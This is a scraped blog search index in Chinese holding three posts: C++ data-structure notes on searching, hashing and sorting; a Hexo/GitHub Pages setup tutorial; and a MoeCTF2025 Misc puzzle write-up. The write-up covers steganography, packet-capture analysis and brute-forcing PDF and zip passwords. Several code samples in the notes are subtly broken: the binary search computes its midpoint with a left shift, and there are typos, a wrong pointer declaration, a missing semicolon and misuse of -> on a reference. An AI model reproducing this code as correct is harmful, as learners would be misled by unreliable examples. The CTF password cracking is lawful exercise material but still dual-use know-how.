vl[j] - G.arcs[i][j]; &#x2F;&#x2F; 活动最晚开始时间 if (e &#x3D;&#x3D; l) &#123; &#x2F;&#x2F; 关键活动 cout &lt;&lt; G.vexs[i] &lt;&lt; &quot; &quot; &lt;&lt; G.vexs[j] &lt;&lt; &quot; &quot; &lt;&lt; G.arcs[i][j] &lt;&lt; endl; &#125; &#125; &#125; &#125; &#125; int main() &#123; Graph G; CreateGraph(G); vector&lt;int&gt; topoOrder; if (!TopologicalSort(G, topoOrder)) &#123; cout &lt;&lt; &quot;ERROR&quot; &lt;&lt; endl; return 0; &#125; vector&lt;int&gt; ve, vl; CalculateVE(G, topoOrder, ve); CalculateVL(G, topoOrder, ve, vl); FindCriticalPath(G, ve, vl); return 0; &#125; 查找 线性表 顺序查找 typedef struct&#123; KeyType key; InfoType otherinfo; &#125;ElemType; typedef struct&#123; ElemType *R; int length; &#125;SSTable; int Search_Seq(SSTable ST,KeyType key)&#123; for(int i&#x3D;ST.length;i&gt;&#x3D;1;i--)&#123; if(ST.R[i],key&#x3D;&#x3D;key)&#123; return i; &#125; &#125; return 0; &#125; 二分查找 typedef struct&#123; KeyType key; InfoType otherinfo; &#125;ElemType; typedef struct&#123; ElemType *R; int length; &#125;SSTable; int Search_Bin(SSTable ST,KeyType key)&#123; int low &#x3D; 1; int high &#x3D; ST.length; while(low&lt;&#x3D;high)&#123; int mid &#x3D; (low+high) &lt;&lt; 1; if(key&#x3D;&#x3D;ST.R[mid].key)&#123; return mid; &#125; else if(key&lt;ST.R[mid].key)&#123; high &#x3D; mid - 1; &#125; else&#123; low &#x3D; mid + 1; &#125; &#125; return 0; &#125; 分块查找 typedef struct&#123; KeyType key; InfoType otherinfo; &#125;ElemType; typedef struct&#123; ElemType *R; int length; &#125;SSTable; typedef struct &#123; KeyType max_key; &#x2F;&#x2F; 块内最大关键字 int start; &#x2F;&#x2F; 块起始位置 int end; &#x2F;&#x2F; 块结束位置 &#125; IndexBlock; int BlockSearch(SSTable ST, IndexBlock index[], int index_len, KeyType key) &#123; int low &#x3D; 0, high &#x3D; index_len - 1; int block_idx &#x3D; -1; &#x2F;&#x2F; 二分查找确定所在块 while (low &lt;&#x3D; high) &#123; int mid &#x3D; (low + high) &#x2F; 2; if (key &lt;&#x3D; index[mid].max_key) &#123; block_idx &#x3D; mid; high &#x3D; mid - 1; &#125; else &#123; low &#x3D; mid + 1; &#125; &#125; if (block_idx &#x3D;&#x3D; -1) return -1; &#x2F;&#x2F; 在块内顺序查找 for (int i &#x3D; index[block_idx].start; i &lt;&#x3D; index[block_idx].end; ++i) &#123; if (ST.R[i].key &#x3D;&#x3D; key) return i; &#125; return -1; &#125; 树表 二叉排序树 typedef struct&#123; KeyType key; InfoType otherinfo; &#125;ElemType; typedef struct BSTNode&#123; ElemType data; struct BSTNode *lchild,*rchild; &#125;BSTNode,*BSTree; BSTree SearchBST(BSTree T,KeyType key)&#123; if(!T || key&#x3D;&#x3D;T-&gt;data.key)&#123; return T; &#125; else if(key&lt;T-&gt;data.key)&#123; return SearchBST(T-&gt;lchild,key); &#125; else&#123; return SearchBST(T-&gt;rchild,key); &#125; &#125; void InsertBST(BSTree &amp;T,ElemType e)&#123; if(!T)&#123; BSTNode S &#x3D; new BSTNode; S-&gt;data &#x3D; e; S-&gt;lchild &#x3D; NULL; S-&gt;rchild &#x3D; NULL; T &#x3D; S; &#125; else if(e.key&lt;T-&gt;data.key)&#123; InsertBST(T-&gt;lchild,e); &#125; else if(e.key&gt;T-&gt;data.key)&#123; InsertBST(T-&gt;rchild,e); &#125; &#125; void CreateBST(BSTree &amp;T)&#123; int e; T &#x3D; NULL; cin &gt;&gt; e; while(e.key!&#x3D;-1)&#123; InsertBST(T,e); cin &gt;&gt; e; &#125; &#125; void DeleteBST(BSTree &amp;T, KeyType key) &#123; BSTree p &#x3D; T; &#x2F;&#x2F; 当前节点指针 BSTree f &#x3D; NULL; &#x2F;&#x2F; 父节点指针 &#x2F;&#x2F; 查找删除节点 while (p) &#123; if (p-&gt;data.key &#x3D;&#x3D; key) break; f &#x3D; p; if (p-&gt;data.key &gt; key) p &#x3D; p-&gt;lchild; else p &#x3D; p-&gt;rchild; &#125; if (!p) return; BSTree q &#x3D; p; &#x2F;&#x2F; 辅助指针 q 指向待删除节点 &#x2F;&#x2F; Case 1: 节点 p 是叶子节点或仅有一个子树 if (!p-&gt;lchild) &#123; &#x2F;&#x2F; 左子树为空，用右子树替换 if (!f) T &#x3D; p-&gt;rchild; &#x2F;&#x2F; p 是根节点 else if (f-&gt;lchild &#x3D;&#x3D; p) f-&gt;lchild &#x3D; p-&gt;rchild; else f-&gt;rchild &#x3D; p-&gt;rchild; free(q); &#125; else if (!p-&gt;rchild) &#123; &#x2F;&#x2F; 右子树为空，用左子树替换 if (!f) T &#x3D; p-&gt;lchild; &#x2F;&#x2F; p 是根节点 else if (f-&gt;lchild &#x3D;&#x3D; p) f-&gt;lchild &#x3D; p-&gt;lchild; else f-&gt;rchild &#x3D; p-&gt;lchild; free(q); &#125; else &#123; &#x2F;&#x2F; Case 2: 节点 p 有两个子树，找左子树的最右节点（前驱） BSTree s &#x3D; p-&gt;lchild; BSTree parent_s &#x3D; p; &#x2F;&#x2F; s 的父节点 while (s-&gt;rchild) &#123; parent_s &#x3D; s; s &#x3D; s-&gt;rchild; &#125; &#x2F;&#x2F; 用前驱 s 替换 p 的值 p-&gt;data &#x3D; s-&gt;data; &#x2F;&#x2F; 删除前驱节点 s（此时 s 至多有一个左子树） if (parent_s &#x3D;&#x3D; p) parent_s-&gt;lchild &#x3D; s-&gt;lchild; else parent_s-&gt;rchild &#x3D; s-&gt;lchild; free(s); &#125; &#125; 哈希表 #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;list&gt; #include &lt;string&gt; using namespace std; &#x2F;&#x2F; 拉链法 static const int tableSize &#x3D; 10; vector&lt;list&lt;pair&lt;int, string&gt;&gt;&gt; chainTable(tableSize); int hashFunction(int key) &#123; return key % tableSize; &#125; void insertChaining(int key, string value) &#123; int index &#x3D; hashFunction(key); chainTable[index].push_back(make_pair(key, value)); &#125; string searchChaining(int key) &#123; int index &#x3D; hashFunction(key); for (auto &amp;p : chainTable[index]) &#123; if (p.first &#x3D;&#x3D; key) return p.second; &#125; return &quot;&quot;; &#125; void removeChaining(int key) &#123; int index &#x3D; hashFunction(key); auto &amp;chain &#x3D; chainTable[index]; for (auto it &#x3D; chain.begin(); it !&#x3D; chain.end(); ++it) &#123; if (it-&gt;first &#x3D;&#x3D; key) &#123; chain.erase(it); return; &#125; &#125; &#125; &#x2F;&#x2F; 开放定址法（以线性探测为例） enum EntryState &#123; EMPTY, OCCUPIED, DELETED &#125;; struct HashEntry &#123; int key; string value; EntryState state; &#125;; vector&lt;HashEntry&gt; openTable(tableSize, &#123;0, &quot;&quot;, EMPTY&#125;); int hashFunctionLP(int key) &#123; return key % tableSize; &#125; void insertLinear(int key, string value) &#123; int idx &#x3D; hashFunctionLP(key); for (int i &#x3D; 0; i &lt; tableSize; ++i) &#123; int probe &#x3D; (idx + i) % tableSize; if (openTable[probe].state &#x3D;&#x3D; EMPTY || openTable[probe].state &#x3D;&#x3D; DELETED) &#123; openTable[probe].key &#x3D; key; openTable[probe].value &#x3D; value; openTable[probe].state &#x3D; OCCUPIED; return; &#125; &#125; &#125; string searchLinear(int key) &#123; int idx &#x3D; hashFunctionLP(key); for (int i &#x3D; 0; i &lt; tableSize; ++i) &#123; int probe &#x3D; (idx + i) % tableSize; if (openTable[probe].state &#x3D;&#x3D; EMPTY) return &quot;&quot;; if (openTable[probe].state &#x3D;&#x3D; OCCUPIED &amp;&amp; openTable[probe].key &#x3D;&#x3D; key) return openTable[probe].value; &#125; return &quot;&quot;; &#125; void removeLinear(int key) &#123; int idx &#x3D; hashFunctionLP(key); for (int i &#x3D; 0; i &lt; tableSize; ++i) &#123; int probe &#x3D; (idx + i) % tableSize; if (openTable[probe].state &#x3D;&#x3D; EMPTY) return; if (openTable[probe].state &#x3D;&#x3D; OCCUPIED &amp;&amp; openTable[probe].key &#x3D;&#x3D; key) &#123; openTable[probe].state &#x3D; DELETED; return; &#125; &#125; &#125; STL unordered_set insert(x) 向集合中插入元素 x（若已存在，则不插入） erase(x) 从集合中删除元素 x find(x) 查找元素 x，返回迭代器；若未找到，返回 end() count(x) 统计元素 x 在集合中出现的次数（要么 0，要么 1） size() 查询集合中元素数量 empty() 判断集合是否为空 clear() 清空集合中的所有元素 #include &lt;iostream&gt; #include &lt;unordered_set&gt; using namespace std; int main()&#123; unordered_set&lt;int&gt; us; us.insert(3); us.insert(1); us.insert(4) us.insert(1); cout &lt;&lt; us.size() &lt;&lt; endl; cout &lt;&lt; (us.find(2) !&#x3D; us.end()) &lt;&lt; endl; cout &lt;&lt; us.count(1) &lt;&lt; endl; us.erase(3); us.clear(); cout &lt;&lt; us.empty() &lt;&lt; endl; &#125; unordered_map insert({k, v}) 向映射中插入键值对 (k, v)（若键已存在，不插入） erase(k) 删除键为 k 的元素 find(k) 查找键为 k 的元素，返回指向该元素的迭代器；若未找到，返回 end() count(k) 统计键 k 在映射中出现的次数（要么 0，要么 1） operator[](k) 如果键 k 存在，返回对应的值；否则插入一个键为 k、值为默认构造的元素并返回其引用 size() 查询映射中元素数量 empty() 判断映射是否为空 clear() 清空映射中的所有元素 #include &lt;iostream&gt; #include &lt;unordered_map&gt; using namespace std; int main()&#123; unordered_map&lt;string, int&gt; um; um.insert(&#123;&quot;apple&quot;, 3&#125;); um.insert(make_pair(&quot;banana&quot;, 5)); um[&quot;cherry&quot;] &#x3D; 2; cout &lt;&lt; um.size() &lt;&lt; endl; cout &lt;&lt; um[&quot;cherry&quot;] &lt;&lt; endl; auto it &#x3D; um.find(&quot;banana&quot;); if (it !&#x3D; um.end()) &#123; cout &lt;&lt; it-&gt;second &lt;&lt; endl; &#125; um.erase(&quot;apple&quot;); um.clear(); cout &lt;&lt; um.empty() &lt;&lt; endl; &#125; 排序 插入排序 #include &lt;iostream&gt; using namespace std; typedef struct &#123; int *r; int length; &#125; SqList; void InsertSort(SqList &amp;L) &#123; for (int i &#x3D; 1; i &lt; L.length; i++) &#123; int temp &#x3D; L.r[i]; int j &#x3D; i - 1; while (j &gt;&#x3D; 0 &amp;&amp; L.r[j] &gt; temp) &#123; L.r[j + 1] &#x3D; L.r[j]; j--; &#125; L.r[j + 1] &#x3D; temp; &#125; &#125; &#x2F;&#x2F; 二分查找插入位置 void BinaryInsertSort(SqList &amp;L) &#123; for (int i &#x3D; 1; i &lt; L.length; i++) &#123; int temp &#x3D; L.r[i]; int start &#x3D; 0; int end &#x3D; i - 1; while (start &lt;&#x3D; end) &#123; int mid &#x3D; (start + end) &#x2F; 2; if (L.r[mid] &gt; temp) &#123; end &#x3D; mid - 1; &#125; else &#123; start &#x3D; mid + 1; &#125; &#125; for (int j &#x3D; i - 1; j &gt;&#x3D; start; j--) &#123; L.r[j + 1] &#x3D; L.r[j]; &#125; L.r[start] &#x3D; temp; &#125; &#125; 希尔排序 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef struct &#123; int data[MAXSIZE]; int length; &#125; Sqlist; void ShellSort(Sqlist &amp;L) &#123; &#x2F;&#x2F; 初始间隔（gap）为长度的一半，逐步缩小间隔直到1 for (int gap &#x3D; L.length &#x2F; 2; gap &gt; 0; gap &#x2F;&#x3D; 2) &#123; &#x2F;&#x2F; 对每个子序列进行插入排序 for (int i &#x3D; gap; i &lt; L.length; i++) &#123; int temp &#x3D; L.data[i]; int j; for (j &#x3D; i; j &gt;&#x3D; gap &amp;&amp; L.data[j - gap] &gt; temp; j -&#x3D; gap) &#123; L.data[j] &#x3D; L.data[j - gap]; &#125; L.data[j] &#x3D; temp; &#125; &#125; &#125; 冒泡排序 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef struct &#123; int data[MAXSIZE]; int length; &#125; Sqlist; void bubble(Sqlist &amp;L) &#123; for (int i &#x3D; L.length - 1; i &gt; 0; i--) &#123; for (int j &#x3D; 0; j &lt; i; j++) &#123; if (L.data[j] &gt; L.data[j + 1]) &#123; swap(L.data[j], L.data[j + 1]); &#125; &#125; &#125; &#125; 快速排序 #include &lt;iostream&gt; using namespace std; void QuickSort(int a[], int m, int n) &#123; if (m &gt;&#x3D; n) return; int low &#x3D; m; int high &#x3D; n; int pivot &#x3D; a[(m + n) &#x2F; 2]; while (low &lt;&#x3D; high) &#123; while (a[low] &lt; pivot) low++; while (a[high] &gt; pivot) high--; if (low &lt;&#x3D; high) &#123; swap(a[low], a[high]); low++; high--; &#125; &#125; QuickSort(a, m, high); QuickSort(a, low, n); &#125; 选择排序 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef struct &#123; int data[MAXSIZE]; int length; &#125; Sqlist; void Select(Sqlist &amp;L) &#123; for (int i &#x3D; 0; i &lt; L.length - 1; i++) &#123; int k &#x3D; i; for (int j &#x3D; i + 1; j &lt; L.length; j++) &#123; if (L.data[j] &lt; L.data[k]) &#123; k &#x3D; j; &#125; &#125; if (k !&#x3D; i) &#123; swap(L.data[i], L.data[k]); &#125; &#125; &#125; 堆排序 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef struct &#123; int data[MAXSIZE]; int length; &#125; Sqlist; void HeapAdjust(Sqlist &amp;L, int s, int m) &#x2F;&#x2F; s: 待调整的子树根节点下标 m：最后一个元素的下标（调整范围上限） &#123; int rc &#x3D; L.data[s]; &#x2F;&#x2F; 沿关键字较大的子节点向下筛选 for (int j &#x3D; 2 * s + 1; j &lt;&#x3D; m; j &#x3D; 2 * j + 1) &#x2F;&#x2F; 完全二叉树 左孩子下标2k+1 &#123; &#x2F;&#x2F; 比较左右孩子，j指向较大的孩子 if (j &lt; m &amp;&amp; L.data[j] &lt; L.data[j + 1]) j &#x3D; j + 1; &#x2F;&#x2F; 右孩子更大，j指向右孩子 &#x2F;&#x2F; 若根节点已比最大孩子大，则调整完成 if (rc &gt;&#x3D; L.data[j]) break; L.data[s] &#x3D; L.data[j]; &#x2F;&#x2F; 将较大孩子值上移 s &#x3D; j; &#x2F;&#x2F; s指向下一层待比较位置 &#125; L.data[s] &#x3D; rc; &#x2F;&#x2F; 将最初根节点值放入最终位置 &#125; void CreateHeap(Sqlist &amp;L) &#123; &#x2F;&#x2F; 从最后一个非叶子节点开始向前调整 for (int i &#x3D; L.length &#x2F; 2 - 1; i &gt;&#x3D; 0; i--) &#123; HeapAdjust(L, i, L.length - 1); &#x2F;&#x2F; 调整以i为根的子树 &#125; &#125; void HeapSort(Sqlist &amp;L) &#123; CreateHeap(L); for (int i &#x3D; L.length - 1; i &gt; 0; i--) &#123; swap(L.data[0], L.data[i]); &#x2F;&#x2F; 堆顶最大值交换到末尾 HeapAdjust(L, 0, i - 1); &#x2F;&#x2F; 调整剩余元素为新堆 &#125; &#125; 归并排序 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef struct &#123; int data[MAXSIZE]; int length; &#125; Sqlist; void Merge(Sqlist &amp;L, int low, int mid, int high) &#123; int *temp &#x3D; new int[high - low + 1]; int i &#x3D; low; &#x2F;&#x2F; 左半部分起始索引 int j &#x3D; mid + 1; &#x2F;&#x2F; 右半部分起始索引 int k &#x3D; 0; &#x2F;&#x2F; 临时数组索引 &#x2F;&#x2F; 合并元素到临时数组 while (i &lt;&#x3D; mid &amp;&amp; j &lt;&#x3D; high) &#123; if (L.data[i] &lt;&#x3D; L.data[j]) temp[k++] &#x3D; L.data[i++]; else temp[k++] &#x3D; L.data[j++]; &#125; &#x2F;&#x2F; 处理剩余元素 while (i &lt;&#x3D; mid) temp[k++] &#x3D; L.data[i++]; while (j &lt;&#x3D; high) temp[k++] &#x3D; L.data[j++]; &#x2F;&#x2F; 将排序好的数据拷贝回原数组 for (i &#x3D; low, k &#x3D; 0; i &lt;&#x3D; high; i++, k++) L.data[i] &#x3D; temp[k]; delete[] temp; &#x2F;&#x2F; 释放临时数组 &#125; &#x2F;&#x2F; 递归分治函数 void MSort(Sqlist &amp;L, int low, int high) &#123; if (low &lt; high) &#123; int mid &#x3D; (low + high) &#x2F; 2; &#x2F;&#x2F; 计算中间位置 MSort(L, low, mid); &#x2F;&#x2F; 递归左半部分 MSort(L, mid + 1, high); &#x2F;&#x2F; 递归右半部分 Merge(L, low, mid, high); &#x2F;&#x2F; 合并已排序部分 &#125; &#125; &#x2F;&#x2F; 归并排序入口函数 void MergeSort(Sqlist &amp;L) &#123; if (L.length &lt;&#x3D; 0) return; MSort(L, 0, L.length - 1); &#x2F;&#x2F; 调用递归排序 &#125; 基数排序 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef struct &#123; int data[MAXSIZE]; int length; &#125; Sqlist; &#x2F;&#x2F; 以位数比较为例 void RadixSort(Sqlist &amp;L) &#123; if (L-&gt;length &lt;&#x3D; 1) return; int max_num &#x3D; L-&gt;data[0]; for (int i &#x3D; 1; i &lt; L-&gt;length; ++i) &#123; if (L-&gt;data[i] &gt; max_num) max_num &#x3D; L-&gt;data[i]; &#125; for (int exp &#x3D; 1; max_num &#x2F; exp &gt; 0; exp *&#x3D; 10) &#123; int count[10] &#x3D; &#123;0&#125;; int output[MAXSIZE]; for (int i &#x3D; 0; i &lt; L-&gt;length; ++i) &#123; int digit &#x3D; (L-&gt;data[i] &#x2F; exp) % 10; count[digit]++; &#125; for (int j &#x3D; 1; j &lt; 10; ++j) &#123; count[j] +&#x3D; count[j - 1]; &#125; for (int i &#x3D; L-&gt;length - 1; i &gt;&#x3D; 0; --i) &#123; int digit &#x3D; (L-&gt;data[i] &#x2F; exp) % 10; output[count[digit] - 1] &#x3D; L-&gt;data[i]; count[digit]--; &#125; for (int i &#x3D; 0; i &lt; L-&gt;length; ++i) &#123; L-&gt;data[i] &#x3D; output[i]; &#125; &#125; &#125;","categories":[{"name":"笔记","slug":"笔记","permalink":"https://saintcen.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CS基础","slug":"CS基础","permalink":"https://saintcen.github.io/tags/CS%E5%9F%BA%E7%A1%80/"}]},{"title":"Hexo-Blog搭建教程","slug":"Hexo-Blog搭建教程","date":"2025-09-24T16:00:00.000Z","updated":"2025-10-03T08:05:29.325Z","comments":true,"path":"2025/09/25/Hexo-Blog搭建教程/","permalink":"https://saintcen.github.io/2025/09/25/Hexo-Blog%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/","excerpt":"","text":"在思考如何搭建个人博客时，我决定采用了Hexo+Github Pages的方案。 纯静态资源网站，只需修改前端代码和资源文件 Github托管，免费且易于维护 Hexo提供了优秀的博客模板和便捷的命令行 参考资料 官方文档：配置 | Hexo 大佬的博客1：Hexo+Github搭建个人Wiki风格博客 | Blogs 大佬的博客2：[三万字教程]基于Hexo的matery主题搭建博客并深度优化一站式完全教程 - 游颜色 环境搭建 基本工具 搭建过程中，需要利用npm下载相关包，用git上传到指定仓库。 Node.js git 具体如何安装使用请自行搜索。 项目部署 1.在Github上创建一个仓库并取名为 用户名.github.io 2.准备一个空文件夹，在文件夹里打开终端，使用npm一键安装 Hexo博客程序 npm install -g hexo-cli 3.进行Hexo初始化 hexo init 4.使用npm安装package.json里面的依赖 npm install 5.安装用于部署的包hexo-deployer-git npm install hexo-deployer-git --save 6.修改_config.yml文件末尾的Deployment部分（善用查找！） 这里建议大家用SSH配置，可以避免网络等问题。 Hexo使用SSH连接GitHub_hexo的ssh连接github-CSDN博客 deploy: type: git repo: git@github.com:你的用户名&#x2F;你的仓库名.git branch: main 主题安装 我选择的是matery，大家也可以去搜索自己喜欢的主题。 GitHub - blinkfox/hexo-theme-matery 具体安装视官方文档而定，大部分可以这么安装。 cd &lt;Your Location&gt; git clone https:&#x2F;&#x2F;github.com&#x2F;blinkfox&#x2F;hexo-theme-matery.git 随后，请修改主文件夹下的_config.yml的theme。 有两个_config.yml？ 公式-Mathjax 1.卸载部分插件 npm un hexo-math npm un hexo-renderer-marked 2.安装hexo-renderer-pandoc渲染器 npm i hexo-renderer-pandoc 3.配置主题配置下的mathjax设置(文件位置在\\themes\\{主题名}\\ _config.yml # MathJax mathjax: enable: true per_page: true 4.安装Pandoc 去Pandoc官网下载最新版本：Pandoc - About pandoc 安装完将_post里的md文件写入公式测试即可。 图片 修改_config.yml如下： post_asset_folder: true marked: prependRoot: true postAsset: true 在文件夹下打开终端，使用hexo new [layout] &lt;title&gt;命令创建一篇新文章（也可以手动创建），此时会在source/_post目录下创建一个同名的文件夹和md文件。接着可以把所有该文章有关的资源文件都放在同名的目录中，在md文件中使用引入格式![image1](image1.png)即可引入图片（如果是网络资源引用网址即可）。 四大命令 hexo clean # 清除生成的网页文件 hexo g # 生成静态网页 hexo s # 本地运行博客 hexo d # 将网页文件推送至远程服务器 问题记录 所有问题的排查，请善用F12控制台的报错信息 渲染报错 Uncaught TypeError: $(...).lightGallery is not a function Uncaught：$(.).lightGallery不是函数-腾讯云开发者社区-腾讯云 把所有本地硬编码替换成cdn，包括_config.yml里的lib和main-style.ejs/layout.ejs的引用。 lightgallery:https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;lightgallery&#x2F;1.10.0&#x2F;css&#x2F;lightgallery.css &lt;script src&#x3D;&quot;&lt;%- theme.libs.js.lightgallery %&gt;&quot;&gt;&lt;&#x2F;script&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;&lt;%- theme.libs.css.lightgallery %&gt;&quot;&gt;","categories":[{"name":"教程","slug":"教程","permalink":"https://saintcen.github.io/categories/%E6%95%99%E7%A8%8B/"}],"tags":[{"name":"开发","slug":"开发","permalink":"https://saintcen.github.io/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"MoeCTF2025_Misc_wp","slug":"MoeCTF2025_Misc_wp","date":"2025-01-08T16:00:00.000Z","updated":"2025-10-13T03:39:16.255Z","comments":true,"path":"2025/01/09/MoeCTF2025_Misc_wp/","permalink":"https://saintcen.github.io/2025/01/09/MoeCTF2025_Misc_wp/","excerpt":"","text":"MoeCTF2025_Misc_wp 工具大赛罢了 环境配置 操作系统：Windows 11/Ubuntu 22.04 LTS 代码环境：python 乱七八糟的工具，写一题找一个 Misc入门指北 欢迎来到misc的世界^ _ ^ 打开PDF，查找moectf，复制隐藏的flag提交即可（注意拉到底）。 moectf&#123;We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!&#125; Rush “冲刺，冲刺！”你正走在路上，耳边传来这样的声音，还没反应过来，就被撞倒了。 你费劲地爬起来，好像看到了什么信息，回过神来那人早已扬长而去，那我缺的这个道歉这块？ 拿到gif发现二维码，截图。 用CQR打开直接发现了隐藏flag。 moectf&#123;QR_C0d3s_feATUR3_eRror_c0RRECt10N&#125; ez_LSB 这是一张普通的图片，但是一个个像素看过去似乎有些蹊跷？ 题目已经告诉我们是图片LSB隐写，我们用zsteg检测下，但flag形式没有意义。 dzc@dzc-virtual-machine:~/zsteg$ zsteg xidian.png b1,r,lsb,xy .. text: \"The flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9\" b1,rgb,lsb,xy .. file: TeX font metric data (\\002H \\002) b1,rgba,msb,xy .. file: OpenPGP Public Key b2,bgr,msb,xy .. file: Applesoft BASIC program data, first line number 128 b3,bgr,msb,xy .. file: Lotus unknown worksheet or configuration, revision 0x8 b4,r,lsb,xy .. file: Targa image data - Map (256-4112) 4096 x 65536 x 1 +4097 +257 - right \"\\001\\020\\001\\020\\021\" b4,bgr,lsb,xy .. file: Targa image data - Map 65536 x 1 x 16 +1 我们用cyberchef尝试base64解码得到flag。 moectf&#123;LSB_1s_s0_1nt3rest1ng!!sj9wd&#125; ez_锟斤拷???? E=hv在记事本里写下了一些神秘字符， 但是经过一通保存另存为的迷之操作之后文本文件里的东西全变成了乱码 拿到了flag.txt文件，UTF-8错误由GBK解码所致，需要对此乱码（锟斤拷）进行处理。 garbled_text = \"锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹\" # 1.用 GBK 编码 gbk_bytes = garbled_text.encode('gbk', errors='replace') # 替换无法编码的字符 # 2.用 UTF-8 解码 original_text = gbk_bytes.decode('utf-8', errors='ignore') # 3.转成半角 import unicodedata def full_to_half(text): return ''.join( unicodedata.normalize('NFKC', char) # NFKC 标准化转换全角→半角 for char in text ) flag = full_to_half(original_text) print(flag) 得到了输出 moectf&#123;EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww&#125;恭喜你得到弗拉格后面全?斤拷锟斤拷锟斤拷 不知道何意味。取前面的flag部分提交即可。 weird_photo FLAG就在图中。什么，你说你看不见 FLAG？注意 CRC！ 提示图片的CRC校验值可能有误，我们用pngcheck检查下。 pngcheck -v photo.png File: photo.png (829531 bytes) chunk IHDR at offset 0x0000c, length 13 900 x 490 image, 24-bit RGB, non-interlaced CRC error in chunk IHDR (computed d34d176f, expected b5a7bf8c) ERRORS DETECTED in photo.png 然后根据西电同学的经验，这个塔楼拍的不太完整，感觉是图片尺寸改掉了？我们用010 Editor编辑下。 搜索b5a7bf8c的位置，改成d34d176f（位置就在IHDR块数据开始的地方）。尺寸384和1EA用十六进制计算就是900和490，我们把高度1EA也改成384看看能不能显示flag。 moectf&#123;Image_Height_Restored&#125; SSTV 识别并解码附件中使用的特殊通信协议，以获取隐藏信息。 已经提示了我们SSTV编码，我们使用RX-SSTV工具，配置虚拟声卡，播放sstv.wav即可。 moectf&#123;d3codiNG_SStV-reQu1REs-PATI3nC3&#125; encrypted_pdf I am so forgetful… So I will use a password that is simple enough. 加密的PDF，密码足够简单，爆破即可，我用的是在线网站I Love PDF。 解密后打开PDF，隐藏方式和入门指北一样，查找moectf。 moectf&#123;Pdf_1s_r3a1ly_c0lor4ul!!ihdw&#125; 啊啊啊啊啊啊啊啊啊啊啊SEC娘宝宝可爱捏~ 捂住一只耳 一只手捂住耳朵 另一只手打开音乐 似乎听到了不一样的声音 明显在暗示单声道与立体声，我们用Audacity工具观察并且分离出上方的声道。 像是有规律的声音，听了一下好像是moise密码，我们用在线网站解码一下就得到flag。 moectf&#123;HALF_RADIO_IN_XDU&#125; 我已经很久没有听到过半部电台的故事了… Enchantment 哇多么好的附魔啊 你把图片发了出去，但似乎附魔台上的文字有一些不对劲？ 得到了一个pngpca文件，我们用wireshark作流量分析。 用http过滤，发现了post方法上传的enchantment.png文件，我们导出分组字节流保存文件为png格式。 这是minecraft里的附魔台文字，我们去网上找一下换算图，一个个对过来就得到flag。 moectf&#123;now_you_have_mastered_enchanting&#125; WebRepo 这都是什么稀奇古怪的格式！？ 直译一下是“网络上的仓库”，但是得到了一个webp文件，好一个一语双关。 扫描二维码告诉我们用binwalk，检查了一下发现是.rar文件，解压出发现了隐藏的.git文件夹，和题目对上了，是个仓库（太对了，真是WebRepo），flag一定藏在提交信息中。 在该目录下打开终端输入git show，得到flag。 moectf&#123;B1NwA1K_ANd_g1t_R3seT-MaG1C&#125; ez_ssl zero6six 在网页内上传了一份秘密文件。望着浏览器提示的“连接安全，信息不会外泄”，他觉得万无一失。 但与此同时，他的浏览器却悄悄上传了另一份文件。现在把他电脑的抓包记录给你，你能破解他的秘密吗？ 得到了一个pngpca文件，我们用wireshark工具作流量分析。题目提示有“秘密文件”和“另一份文件”，我们应该要把两个都找到。 http过滤查看post方法上传的文件，发现是ssl.log日志文件；而html文件显示进行了文件上传操作。 查了一下和TLS有关，配置ssl.log文件后发现了http过滤后的信息变多，有一个zip文件，我们把文件导出，发现里面存在flag.txt。 然！后！我就一直以为ssl.log或者其他地方藏了密码，用各种方式去试都不行……最后发现压缩包写了密码是7位纯数字。用工具ARCHPR直接爆破。 得到密码：6921682，解压压缩包得到Ook编码，找个在线网站解码一下得到flag。 moectf&#123;upI0@d-l0G_TO-DeCrYPT_uploAD&#125; ez_png 这张平平无奇的图片里藏着一个小秘密。秘密不在颜色中，而在文件的骨骼里。注意：某些数据段的长短似乎不太协调。 对于图片结构，我们可以使用工具pngcheck。 File: ez_png.png (899069 bytes) chunk IHDR at offset 0x0000c, length 13 900 x 600 image, 24-bit RGB, non-interlaced chunk pHYs at offset 0x00025, length 9: 2835x2835 pixels&#x2F;meter (72 dpi) chunk IDAT at offset 0x0003a, length 65524 zlib: deflated, 32K window, default compression chunk IDAT at offset 0x1003a, length 65524 chunk IDAT at offset 0x2003a, length 65524 chunk IDAT at offset 0x3003a, length 65524 chunk IDAT at offset 0x4003a, length 65524 chunk IDAT at offset 0x5003a, length 65524 chunk IDAT at offset 0x6003a, length 65524 chunk IDAT at offset 0x7003a, length 65524 chunk IDAT at offset 0x8003a, length 65524 chunk IDAT at offset 0x9003a, length 65524 chunk IDAT at offset 0xa003a, length 65524 chunk IDAT at offset 0xb003a, length 65524 chunk IDAT at offset 0xc003a, length 65524 chunk IDAT at offset 0xd003a, length 46973 chunk IDAT at offset 0xdb7c3, length 38 chunk IEND at offset 0xdb7f5, length 0 No errors detected in ez_png.png (18 chunks, 44.5% compression). 发现有数据块不正常，用binwalk检查一下，直接拆出来了zlib文件，点开就得到了flag。 moectf&#123;h1DdEn_P4YlOaD_IN-Id4T&#125; 万里挑一 要想冲破封锁，寻得真谛，须从万把钥匙中找出唯一的答案 